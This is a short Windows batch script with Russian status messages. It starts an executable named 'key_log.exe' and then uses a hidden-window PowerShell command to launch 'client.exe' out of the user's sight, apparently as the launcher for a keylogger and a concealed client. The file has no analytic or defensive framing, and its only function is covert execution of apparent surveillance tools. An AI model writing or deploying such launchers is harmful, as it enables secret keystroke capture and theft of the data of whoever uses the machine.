@echo off
chcp 65001 >nul

echo Текущая папка: %cd%
echo.

echo Запуск приложений...

REM Запускаем с явным указанием пути
start "" "%cd%\key_log.exe"

powershell -WindowStyle Hidden -Command "Start-Process '%cd%\client.exe' -WindowStyle Hidden"

echo k_log.exe запущен (видимый)
echo client.exe запущен (скрытый)
echo.
pause
exit